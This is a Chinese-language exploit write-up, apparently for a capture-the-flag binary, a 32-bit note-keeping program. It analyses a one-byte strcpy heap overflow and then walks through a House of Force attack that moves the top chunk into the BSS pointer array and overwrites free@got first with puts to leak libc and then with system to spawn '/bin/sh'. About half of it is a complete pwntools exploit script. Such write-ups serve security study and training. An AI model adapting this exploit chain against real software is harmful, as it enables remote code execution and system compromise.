# 漏洞利用文档

## 执行环境
基于反编译代码和exp分析，程序运行环境如下：
- **二进制类型**：ELF 32-bit LSB executable, Intel 80386
- **安全机制**：
  - Partial RELRO: GOT表可写
  - Stack Canary: 栈保护启用
  - NX Enabled: 数据段不可执行
  - No PIE: 代码段固定地址
- **依赖库**：libc.so.6（动态链接）
- **运行要求**：需要标准输入输出，无特殊权限要求

## 漏洞成因
### 关键结构体分析
- **堆块结构**：标准glibc堆块，包含prev_size和size字段
- **全局变量**：
  - `dword_804B120[10]`: 笔记指针数组
  - `dword_804B0A0[10]`: 笔记大小数组  
  - `dword_804B0E0[10]`: 同步标志数组
  - `dword_804B0CC`: 名字堆块指针
  - `dword_804B0C8`: Org堆块指针
  - `dword_804B148`: Host堆块指针

### 漏洞分析
**漏洞类型**：堆溢出（Heap Overflow）

**漏洞位置**：`sub_80487A1()`函数中的`strcpy(v2, s)`
- `s`为栈上64字节缓冲区，通过`sub_804868D`安全读取
- `v2`为堆上分配的0x40字节（64字节）缓冲区
- `strcpy`无长度检查，当输入恰好64字节时，会复制65字节（包括null终止符），导致溢出1字节

**溢出影响**：
- 溢出到相邻的Host堆块，覆盖其`prev_size`字段
- 破坏堆元数据完整性，为House of Force攻击创造条件

## 漏洞利用过程
### 内存变化时间线

| 步骤 | 操作 | 关键内存变化 | 攻击效果 |
|------|------|--------------|----------|
| 1 | 输入名字('a'*64) | Host堆块prev_size被覆盖为0x92c5008 | 泄漏堆地址 |
| 2 | 输入Org/Host | Host堆块数据区写入0xffffffff+'c'*60 | 准备House of Force |
| 3 | House of Force分配 | top chunk移动到BSS段0x804b238 | 获得任意地址分配能力 |
| 4 | 分配多个note | 在BSS段分配note，控制ptr_array | 建立可控指针结构 |
| 5 | 编辑note1指针 | ptr_array包含GOT地址和自身指针 | 准备GOT覆盖 |
| 6 | 编辑note2内容 | free@got.plt被覆盖为puts@plt | 控制流劫持准备 |
| 7 | 删除note3 | 触发puts调用，泄漏printf地址 | 计算libc基址 |
| 8 | 解析泄漏地址 | libc.address = printf_addr - libc.sym['printf'] | 获得libc基址 |
| 9 | 重新编辑note1 | 设置"/bin/sh"字符串和GOT指针 | 准备system调用 |
| 10 | 编辑note2内容 | free@got.plt被覆盖为system地址 | 完成GOT劫持 |
| 11 | 删除note0 | 触发system("/bin/sh") | 获取shell权限 |
| 12 | 交互模式 | 进程替换为/bin/dash | 完全控制 |

### 堆布局演变
- **初始**：名字堆块(0x92c5008) → Host堆块(0x92c5048) → Org堆块(0x92c5098) → top chunk(0x92c50d8)
- **溢出后**：Host堆块prev_size=0x92c5008（被恶意覆盖）
- **攻击后**：top chunk移动到BSS段(0x804b238)，ptr_array被完全控制

### GOT表变化
- **初始**：free@got.plt = 0x80484e6 (free@plt+6)
- **阶段6**：free@got.plt = 0x08048520 (puts@plt)  
- **阶段10**：free@got.plt = 0xf7da1db0 (system函数)

## Exploit
```python
from pwn import *
from LibcSearcher import *

# 设置调试环境
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample20')
p = process('./data/sample20')

# 获取关键地址
free_got = elf.got['free']
puts_plt = elf.plt['puts']
printf_got = elf.got['printf']
libc = elf.libc

def new_note(size, content, io:tube=p):
    """创建新笔记"""
    io.sendlineafter(b'option--->>\n', b'1')
    io.sendlineafter(b'Input the length of the note content:\n', str(size).encode())
    io.sendlineafter(b'Input the content:\n', content)
    io.recvline()

def edit_note(idx, content, io:tube=p):
    """编辑笔记内容"""
    io.sendlineafter(b'option--->>\n', b'3')
    io.sendlineafter(b'Input the id:\n', str(idx).encode())
    io.sendlineafter(b'Input the new content:\n', content)
    io.recvline()

def del_note(idx, io:tube=p):
    """删除笔记"""
    io.sendlineafter(b'option--->>\n', b'4')
    io.sendlineafter(b'Input the id:\n', str(idx).encode())

# Step 1: 堆地址泄漏
# 通过溢出覆盖Host堆块的prev_size字段，然后读取泄漏的堆地址
p.sendafter(b'Input your name:\n', b'a' * 0x40)
p.recvuntil(b'a' * 0x40)
leak_heap_addr = u32(p.recvn(4))  # 泄漏的堆地址

# Step 2: 准备House of Force攻击
# 设置Host堆块数据，为后续攻击做准备
p.sendafter(b'Org:\n', b'b' * 0x40)
p.sendafter(b'Host:\n', p32(0xffffffff) + (0x40 - 4) * b'c')
p.recvuntil(b'OKay! Enjoy:)\n')

# Step 3: House of Force攻击
# 计算偏移，将top chunk移动到BSS段的ptr_array附近
top_chunk_addr = leak_heap_addr + 0xd0
ptr_array = 0x804b120
margin = ptr_array - top_chunk_addr
new_note(margin - 20, "")  # 触发House of Force，移动top chunk

# Step 4: 在BSS段分配多个笔记
# 利用移动后的top chunk在全局变量区域分配笔记
new_note(0x40, b'aa')
new_note(0x40, b'aa') 
new_note(0x40, b'aa')
new_note(0x40, b'aa')

# Step 5: 编辑指针数组
# 设置ptr_array包含GOT表地址，为GOT覆盖做准备
edit_note(1, p32(0x804b120) * 2 + p32(free_got) + p32(printf_got))

# Step 6: GOT覆盖阶段1 - 覆盖为puts
# 将free@got.plt覆盖为puts@plt，用于泄漏libc地址
edit_note(2, p32(puts_plt))

# Step 7: 触发泄漏
# 删除笔记触发puts调用，泄漏printf的实际地址
del_note(3)

# Step 8: 计算libc基址
# 从泄漏的地址计算libc基址
msg = p.recvuntil(b'Delete success.\n')
printf_addr = u32(msg[:4])
libc.address = printf_addr - libc.sym['printf']

# Step 9: 重新设置攻击载荷
# 设置"/bin/sh"字符串和GOT指针，准备最终攻击
edit_note(1, p32(0x804b130) * 2 + p32(free_got) * 2 + b'/bin/sh')

# Step 10: GOT覆盖阶段2 - 覆盖为system
# 将free@got.plt覆盖为libc中的system函数地址
edit_note(2, p32(libc.sym['system']))

# Step 11: 触发shell
# 删除笔记触发system("/bin/sh")调用，获取shell
del_note(0)

# Step 12: 交互模式
p.interactive()
```

### 关键注释说明
1. **堆地址泄漏**：利用strcpy溢出覆盖相邻堆块的prev_size字段，通过读取该值获得堆基址
2. **House of Force**：通过精心计算的分配大小，将top chunk移动到全局变量区域，实现任意地址分配
3. **GOT覆盖**：分两个阶段：先覆盖为puts用于泄漏libc地址，再覆盖为system用于获取shell
4. **参数准备**：在BSS段设置"/bin/sh"字符串作为system函数的参数
5. **触发执行**：通过删除笔记调用free函数，实际执行system("/bin/sh")

此漏洞利用成功绕过了Partial RELRO、Stack Canary、NX等保护机制，展示了从堆溢出到完整权限获取的完整攻击链。
